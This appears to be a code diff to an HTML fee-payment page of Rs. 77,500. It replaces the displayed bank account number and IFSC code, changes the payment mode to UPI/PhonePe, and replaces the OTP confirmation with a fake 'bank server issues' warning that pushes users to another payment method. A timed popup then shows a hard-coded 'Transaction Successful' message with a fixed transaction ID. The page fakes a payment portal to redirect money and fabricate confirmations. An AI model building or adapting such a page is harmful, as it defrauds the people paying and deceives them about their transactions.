@@ -315,8 +315,7 @@
                                 </div>
                                 <div class="innerbox">
                                     <p class="heading">Payment Mode</p>
-                                    <p>Online Payment (Netbanking, Credit Card/Debit
-                                        Card)</p>
+                                    <p>UPI/PhonePe</p>
                                 </div>
                             </div>
                         </div>
@@ -333,14 +332,15 @@
                         <div class="col-md-6">
                             <div class="inputbox">
                                 <small><b>Account No. : </b></small>
-                                <p>50100657390382
+                                <p>3271192532
+
 </p>
                             </div>
                         </div>
                         <div class="col-md-6">
                             <div class="inputbox">
                                 <small><b>IFSC Code : </b></small>
-                                <p>HDFC0006429
+                                <p>CBIN0282036
 </p>
                             </div>
                         </div>
@@ -387,9 +387,9 @@
     document.getElementById('sendOtpButton').addEventListener('click', function () {
         setTimeout(function () {
             Swal.fire({
-                title: 'OTP Sent Successfully!',
-                text: 'Please check your registered mobile number or email for the OTP.',
-                icon: 'success',
+                title: 'Warning!',
+                text: 'We are currently experiencing server issues with our bank. Please try using an alternative payment method. We apologize for the inconvenience and appreciate your understanding.',
+                icon: 'warning',
                 confirmButtonText: 'OK'
             });
         }, 3000);
@@ -421,10 +421,10 @@
         setTimeout(() => {
             Swal.fire({
                 title: 'Transaction Successful!',
-                html: 'Fees of Rs. 77,500 has been paid successfully.<br><strong>Transaction Id :</strong><b>T7A6B4C1D9E2F3G8H0J1K</b>',
+                html: 'Fees of Rs. 77,500 has been paid successfully.<br><strong>Transaction Id : </strong> <b>T7A6B4C1D9E2F3G8H0J1K</b>',
                 icon: 'success',
                 confirmButtonText: 'OK'
             });
-        }, 150000);
+        }, 60000);
     });
 </script>
